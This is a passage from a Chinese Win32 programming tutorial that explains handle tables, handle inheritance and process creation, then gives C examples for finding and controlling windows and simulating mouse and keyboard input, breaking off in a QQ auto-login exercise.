title="句柄表"></a>句柄表</h2><p>没法直接管理内核对象，这时候句柄表就诞生了，但是需要注意的是，只有进程才会有句柄表，并且每一个进程都会有一个句柄表。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-20_1-1-58.png" alt="images/download/attachments/12714992/image2021-5-20_1-1-58.png"></p><p>句柄本质上就一个防火墙，将应用层、内核层隔离开来，通过句柄就可以控制进程内核结构体，我们得到所谓句柄的值实际上就是句柄表里的一个索引。</p><h2 id="多进程共享内核对象"><a href="#多进程共享内核对象" class="headerlink" title="多进程共享内核对象"></a>多进程共享内核对象</h2><p>如下图所示，A进程通过<strong>CreateProcess函数</strong>创建了一个内核对象；B进程通过<strong>OpenProcess函数</strong>可以打开别人创建好的一个进程，也就是可以操作其的内核对象；A进程想要操作内核对象就通过其对应的句柄表的句柄（索引）来操作；B进程操作这个内核对象也是通过它自己的句柄表的句柄（索引）来操作内核对象。（需要注意的是：句柄表是一个私有的，句柄值就是进程自己句柄表的索引）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-21_0-19-38.png" alt="images/download/attachments/12714992/image2021-5-21_0-19-38.png"></p><p>在之前的例子中我们提到了CloseHandle这个函数是用来关闭进程、线程的，其实它的本质就是释放句柄，但是并不代表执行了这个函数，创建的内核对象就会<strong>彻底消失</strong>；如上图中所示内核对象存在一个计数器，目前是2，它的值是根据调用A的次数来决定的，如果我们只是在A进程中执行了<strong>CloseHandle函数</strong>，内核对象并不会消失，因为进程B还在使用，而只有进程B也执行了<strong>CloseHandle函数</strong>，这个内核对象的计数器为0，就会关闭消失了。</p><p><strong>最后</strong>：注意，以上所述特性适合于除了线程以外的所有内核对象，创建进程，同时也会创建线程，如果你想把线程关闭，首先需要<strong>CloseHandle函数</strong>要让其计数器为0，其次需要有人将其关闭，所以假设我们创建了一个IE进程打开了一个网站，如果我们只是在代码中使用了<strong>CloseHandle函数</strong>，这样IE浏览器并不会关闭，需要我们手动点击窗口的关闭按钮才行（<strong>只有线程关闭了，进程才会关闭</strong>）。</p><h2 id="句柄是否”可以”被继承"><a href="#句柄是否”可以”被继承" class="headerlink" title="句柄是否”可以”被继承"></a>句柄是否”可以”被继承</h2><p>除了我们上述的方式可以进行共享内核对象以外，Windows还设计了一种方式来提供我们共享内核对象，我们先来了解一下句柄是否”可以”被继承。</p><p>如下图所示（<strong>句柄表是有三列的，分别是句柄值、内核结构体地址、句柄是否可以被继承</strong>），比如说我们在A进程（父进程）创建了4个内核对象：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-21_0-51-37.png" alt="images/download/attachments/12714992/image2021-5-21_0-51-37.png"></p><p>这四个函数都有一个参数<strong>LPSECURITY_ATTRIBUTES lpThreadAttributes</strong>，通过这个参数我们可以判断函数是否创建的是内核对象。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-21_0-57-16.png" alt="images/download/attachments/12714992/image2021-5-21_0-57-16.png"></p><p>我们可以跟进看一下这个参数，它就是一个结构体：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-21_1-2-23.png" alt="images/download/attachments/12714992/image2021-5-21_1-2-23.png"></p><p>结构体成员分别是：<strong>1.结构体长度；2.安全描述符；3.句柄是否被继承</strong>。</p><p>第一个成员我们见怪不怪了，在Windows设计下都会有这样一个成员；第二个安全描述符，这个对我们来说实际上没有任何意义，一般留空就行，默认它会遵循父进程的来，其主要作用就是<strong>描述谁创建了该对象，谁有访问、使用该对象的权限</strong>。</p><p>第三个成员是我们重点需要关注的，因为其决定了句柄是否可以被继承，如下图所示，我们让CreateProcess函数创建的进程、线程句柄可以被继承：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-21_1-29-4.png" alt="images/download/attachments/12714992/image2021-5-21_1-29-4.png"></p><h2 id="句柄是否”允许”被继承"><a href="#句柄是否”允许”被继承" class="headerlink" title="句柄是否”允许”被继承"></a>句柄是否”允许”被继承</h2><p>我们可以让句柄被继承，但也仅仅是可以，要真正完成继承，或者说我们允许子进程继承父进程的句柄，这时候就需要另外一个参数了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-21_1-38-10.png" alt="images/download/attachments/12714992/image2021-5-21_1-38-10.png"></p><p>我们还是以CreateProcess函数举例，其有一个参数<strong>BOOL bInheritHandles</strong>，这个参数决定了是否允许创建的子进程继承句柄：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-21_1-42-32.png" alt="images/download/attachments/12714992/image2021-5-21_1-42-32.png"></p><p>只有这个参数设置为TRUE时，我们创建的子进程才允许继承父进程的句柄。</p><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>程序所需要的资源（数据、代码…）是由进程提供的；进程是一种空间上的概念，它的责任就是提供资源，至于资源如何使用，与它无关。</p><p>每一个进程都有自己的一个4GB大小的虚拟空间，也就是从0x0-0xFFFFFFFF这个范围。</p><p>进程内存空间的地址划分如下，每个进程的内核是同一份（高2G），只有其他三个分区是进程独有的（低2G），而只有用户模式区是我们使用的范围：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-17_23-53-53.png" alt="images/download/attachments/12714992/image2021-5-17_23-53-53.png"></p><p>进程也可以理解为是一对模块组成的，我们可以使用OD打开一个进程看一下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-18_0-14-56.png" alt="images/download/attachments/12714992/image2021-5-18_0-14-56.png"></p><p>这里面有很多的模块，每个模块都是一个可执行文件，它们遵守相同的格式，即PE结构，所以我们也可以理解进程就是一堆PE组合。</p><h2 id="进程和线程之间的关系"><a href="#进程和线程之间的关系" class="headerlink" title="进程和线程之间的关系"></a>进程和线程之间的关系</h2><p>一个进程可以包含多个线程，如老师所说（<strong>一个进程至少要包含一个线程，进程是4GB，线程就是EIP</strong>）。</p><p>打开任务管理器，可以看到一个进程包含的线程个数</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220119124918815.png" alt="image-20220119124918815"></p><h2 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h2><p>我们需要知道任何进程都是别的进程创建的，当我们在Windows下双击打开一个文件，实际上就是explorer.exe这个进程创建的子进程。我们打开文件的进程，其使用的方法就是CreateProcess()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CreateProcess</span><span class="hljs-params">(</span><br><span class="hljs-params">LPCTSTR lpApplicationName,<span class="hljs-comment">// name of executable module</span></span><br><span class="hljs-params">LPTSTR lpCommandLine,<span class="hljs-comment">// command line string</span></span><br><span class="hljs-params">LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="hljs-comment">// SD</span></span><br><span class="hljs-params">LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="hljs-comment">// SD</span></span><br><span class="hljs-params">BOOL bInheritHandles,<span class="hljs-comment">// handle inheritance option</span></span><br><span class="hljs-params">DWORD dwCreationFlags,<span class="hljs-comment">// creation flags</span></span><br><span class="hljs-params">LPVOID lpEnvironment,<span class="hljs-comment">// new environment block</span></span><br><span class="hljs-params">LPCTSTR lpCurrentDirectory,<span class="hljs-comment">// current directory name</span></span><br><span class="hljs-params">LPSTARTUPINFO lpStartupInfo,<span class="hljs-comment">// startup information</span></span><br><span class="hljs-params">LPPROCESS_INFORMATION lpProcessInformation <span class="hljs-comment">// process information</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>进程创建的过程也就是<strong>CreateProcess函数</strong>：</p><ol><li>映射EXE文件（低2G）</li><li>创建内核对象EPROCESS（高2G）</li><li>映射系统DLL（ntdll.dll）</li><li>创建线程内核对象RTHREAD（高2G）</li><li>系统启动线程：<ol><li>映射DLL（ntdll.LdrInitializeThunk）</li><li>线程开始执行</li></ol></li></ol><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-18_0-17-35.png" alt="images/download/attachments/12714992/image2021-5-18_0-17-35.png"></p><p>如上图就是打开A.exe的创建过程图，进程是空间上的概念，只用于提供代码和数据资源等等…而想要使用这些资源的是线程，每个进程至少需要一个线程。</p><p>在映射EXE文件时主要做了如下几件事</p><ol><li>将EXE拉伸，存储到指定的位置</li><li>遍历EXE导入表，将需要用到的DLL拉伸存储到指定位置，如果位置被占用就换个地方，并通过DLL的重定位表，修复全局遍历</li><li>DLL如果引用了其他的DLL 递归第二步</li><li>修复EXE&#x2F;DLL中的IAT表</li></ol><h1 id="Win32下的自动化测试"><a href="#Win32下的自动化测试" class="headerlink" title="Win32下的自动化测试"></a>Win32下的自动化测试</h1><p>一个简单又必须掌握的技能</p><h2 id="查找窗口与控制窗口"><a href="#查找窗口与控制窗口" class="headerlink" title="查找窗口与控制窗口"></a>查找窗口与控制窗口</h2><p>查找指定窗口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>HWND hwnd = ::FindWindow(TEXT(<span class="hljs-string">&quot;#32770&quot;</span>),TEXT(<span class="hljs-string">&quot;飞鸽传书  IP Messenger&quot;</span>));<br><span class="hljs-keyword">if</span>(hwnd != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">//修改窗口标题</span><br>::SetWindowText(hwnd,<span class="hljs-string">&quot;新的窗口标题&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>::MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;窗口没有找到&quot;</span>),TEXT(<span class="hljs-string">&quot;[ERROR]&quot;</span>),MB_OK);<br>&#125;<br></code></pre></td></tr></table></figure><p>控制窗口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>HWND hwnd = ::FindWindow(TEXT(<span class="hljs-string">&quot;#32770&quot;</span>),TEXT(<span class="hljs-string">&quot;飞鸽传书  IP Messenger&quot;</span>));<br><span class="hljs-keyword">if</span>(hwnd != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(WINAPI *PSWITCHTOTHISWINDOW)</span> <span class="hljs-params">(HWND,BOOL)</span>;<br>PSWITCHTOTHISWINDOW SwitchToThisWindow;<br>HMODULE hUser32=LoadLibrary(<span class="hljs-string">&quot;user32.dll&quot;</span>);<br>SwitchToThisWindow=(PSWITCHTOTHISWINDOW)GetProcAddress(hUser32,<span class="hljs-string">&quot;SwitchToThisWindow&quot;</span>);<br><br><span class="hljs-comment">//切换窗口</span><br>SwitchToThisWindow(hwnd,<span class="hljs-literal">false</span>);<br><br>Sleep(<span class="hljs-number">3000</span>);<br><span class="hljs-comment">//关闭窗口 </span><br>::SendMessage(hwnd,WM_CLOSE,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>::MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;窗口没有找到&quot;</span>),TEXT(<span class="hljs-string">&quot;[ERROR]&quot;</span>),MB_OK);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="查找子窗口"><a href="#查找子窗口" class="headerlink" title="查找子窗口"></a>查找子窗口</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>HWND hwnd = ::FindWindow(TEXT(<span class="hljs-string">&quot;#32770&quot;</span>),TEXT(<span class="hljs-string">&quot;飞鸽传书  IP Messenger&quot;</span>));<br><span class="hljs-keyword">if</span>(hwnd != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">//查找子窗口</span><br>HWND hEdit = FindWindowEx(hwnd,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&quot;Edit&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">//设置标题</span><br>::SetWindowText(hEdit,<span class="hljs-string">&quot;文本框新的标题&quot;</span>);<br><span class="hljs-comment">//修改内容</span><br>::SendMessage(hEdit,WM_SETTEXT,<span class="hljs-number">0</span>,(LPARAM)<span class="hljs-string">&quot;新的内容&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>::MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;窗口没有找到&quot;</span>),TEXT(<span class="hljs-string">&quot;[ERROR]&quot;</span>),MB_OK);<br>&#125;<br><br><br>TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>HWND hwnd = ::FindWindow(TEXT(<span class="hljs-string">&quot;#32770&quot;</span>),TEXT(<span class="hljs-string">&quot;飞鸽传书  IP Messenger&quot;</span>));<br><span class="hljs-keyword">if</span>(hwnd != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">//查找子窗口</span><br>HWND hEdit =::GetDlgItem(hwnd,<span class="hljs-number">0x3E9</span>);<br><span class="hljs-comment">//获取内容</span><br>::SendMessage(hEdit,WM_GETTEXT,MAX_PATH,(LPARAM)szTitle);<br><span class="hljs-comment">//修改内容</span><br>::SendMessage(hEdit,WM_SETTEXT,<span class="hljs-number">0</span>,(LPARAM)<span class="hljs-string">&quot;新的内容&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>::MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;窗口没有找到&quot;</span>),TEXT(<span class="hljs-string">&quot;[ERROR]&quot;</span>),MB_OK);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="枚举子窗口控件"><a href="#枚举子窗口控件" class="headerlink" title="枚举子窗口控件"></a>枚举子窗口控件</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL CALLBACK <span class="hljs-title function_">EnumChildProc</span><span class="hljs-params">(HWND hWnd,LPARAM lParam)</span>  <br>&#123;  <br>    TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>    ::GetWindowText(hWnd,szTitle,MAX_PATH); <br>    MessageBox(<span class="hljs-literal">NULL</span>,szTitle,<span class="hljs-string">&quot;[子窗口]&quot;</span>,MB_OK);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>&#125;  <br><br>VOID <span class="hljs-title function_">EnumChildWindow</span><span class="hljs-params">()</span><br>&#123;<br>TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>HWND hWnd = ::FindWindow(TEXT(<span class="hljs-string">&quot;#32770&quot;</span>),TEXT(<span class="hljs-string">&quot;飞鸽传书  IP Messenger&quot;</span>));<br><span class="hljs-keyword">if</span>(hWnd != <span class="hljs-literal">NULL</span>)<br>&#123;<br>::EnumChildWindows(hWnd,EnumChildProc,<span class="hljs-number">0</span>);  <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>::MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;窗口没有找到&quot;</span>),TEXT(<span class="hljs-string">&quot;[ERROR]&quot;</span>),MB_OK);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="枚举所有打开窗口"><a href="#枚举所有打开窗口" class="headerlink" title="枚举所有打开窗口"></a>枚举所有打开窗口</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL CALLBACK <span class="hljs-title function_">EnumOpenWindowProc</span><span class="hljs-params">(HWND hWnd,LPARAM lParam)</span>  <br>&#123;  <br>    TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>    ::GetWindowText(hWnd,szTitle,MAX_PATH); <br>    MessageBox(<span class="hljs-literal">NULL</span>,szTitle,<span class="hljs-string">&quot;[窗口]&quot;</span>,MB_OK);  <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(szTitle,<span class="hljs-string">&quot;飞鸽传书  IP Messenger&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,szTitle,<span class="hljs-string">&quot;[窗口]&quot;</span>,MB_OK);  <br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>    <span class="hljs-keyword">return</span> TRUE;  <br>&#125;  <br>VOID <span class="hljs-title function_">EnumOpenWindows</span><span class="hljs-params">()</span><br>&#123;<br>EnumWindows(EnumOpenWindowProc,<span class="hljs-literal">NULL</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="模拟鼠标单击"><a href="#模拟鼠标单击" class="headerlink" title="模拟鼠标单击"></a>模拟鼠标单击</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>RECT r;<br>HWND hwnd = ::FindWindow(TEXT(<span class="hljs-string">&quot;#32770&quot;</span>),TEXT(<span class="hljs-string">&quot;飞鸽传书  IP Messenger&quot;</span>));<br><span class="hljs-keyword">if</span>(hwnd != <span class="hljs-literal">NULL</span>)<br>&#123;<br>HWND hButton = FindWindowEx(hwnd,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&quot;Button&quot;</span>,<span class="hljs-string">&quot;刷新(&amp;R)&quot;</span>);<br><br><span class="hljs-comment">//获取窗口坐标</span><br>::GetWindowRect(hButton,&amp;r);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,r.left,r.top);<br><br><span class="hljs-comment">//设置鼠标的位置</span><br>::SetCursorPos(r.left+<span class="hljs-number">10</span>,r.top+<span class="hljs-number">10</span>);<br>Sleep(<span class="hljs-number">2000</span>);<br><span class="hljs-comment">//鼠标左键单击</span><br>mouse_event(MOUSEEVENTF_LEFTDOWN,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//点下左键 </span><br>mouse_event(MOUSEEVENTF_LEFTUP,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//松开左键</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>::MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;窗口没有找到&quot;</span>),TEXT(<span class="hljs-string">&quot;[ERROR]&quot;</span>),MB_OK);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="模拟键盘"><a href="#模拟键盘" class="headerlink" title="模拟键盘"></a>模拟键盘</h2><p>这里模拟键盘点击需要自行搜索键盘键与虚拟键码对照表（不是不是ASCII码！！）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>RECT r;<br>HWND hwnd = ::FindWindow(TEXT(<span class="hljs-string">&quot;#32770&quot;</span>),TEXT(<span class="hljs-string">&quot;飞鸽传书  IP Messenger&quot;</span>));<br><span class="hljs-keyword">if</span>(hwnd != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">//HWND hButton = FindWindowEx(hwnd,NULL,&quot;Button&quot;,&quot;刷新(&amp;R)&quot;);</span><br>HWND hEdit =::GetDlgItem(hwnd,<span class="hljs-number">0x3E9</span>);<br><br><span class="hljs-comment">//获取窗口坐标</span><br>::GetWindowRect(hEdit,&amp;r);<br><br><span class="hljs-comment">//设置鼠标的位置</span><br>::SetCursorPos(r.left+<span class="hljs-number">1</span>,r.top+<span class="hljs-number">1</span>);<br>Sleep(<span class="hljs-number">1000</span>);<br><br><span class="hljs-comment">//鼠标左键单击</span><br>mouse_event(MOUSEEVENTF_LEFTDOWN,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//点下左键 </span><br>mouse_event(MOUSEEVENTF_LEFTUP,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//松开左键</span><br><br><span class="hljs-comment">//模拟键盘</span><br>keybd_event(<span class="hljs-number">97</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">97</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br>Sleep(<span class="hljs-number">1000</span>);<br>keybd_event(<span class="hljs-number">66</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">66</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br>Sleep(<span class="hljs-number">1000</span>);<br>keybd_event(<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>::MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;窗口没有找到&quot;</span>),TEXT(<span class="hljs-string">&quot;[ERROR]&quot;</span>),MB_OK);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="练习：模拟QQ登录"><a href="#练习：模拟QQ登录" class="headerlink" title="练习：模拟QQ登录"></a>练习：模拟QQ登录</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// qq_autologin.cpp : 定义控制台应用程序的入口点。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><br>TCHAR path[MAX_PATH]=_T(<span class="hljs-string">&quot;C:\\Program Files\\Tencent\\QQ\\Bin\\QQScLauncher.exe&quot;</span>);<br>BOOL bFindFlag;<br><br>BOOL CALLBACK <span class="hljs-title function_">EnumOpenWindowProc</span><span class="hljs-params">(HWND hWnd,LPARAM lParam)</span>  <br>&#123;  <br>TCHAR szTitle[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>RECT r;<br>::GetWindowText(hWnd,szTitle,MAX_PATH);  <br><span class="hljs-keyword">if</span>(lstrcmp(szTitle,_T(<span class="hljs-string">&quot;QQ&quot;</span>)) == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-comment">// 找到了 </span><br>bFindFlag = TRUE;<br>SwitchToThisWindow(hWnd,<span class="hljs-literal">false</span>);<br><span class="hljs-comment">// 获取对话框左上角位置</span><br>::GetWindowRect(hWnd,&amp;r);<br><br><span 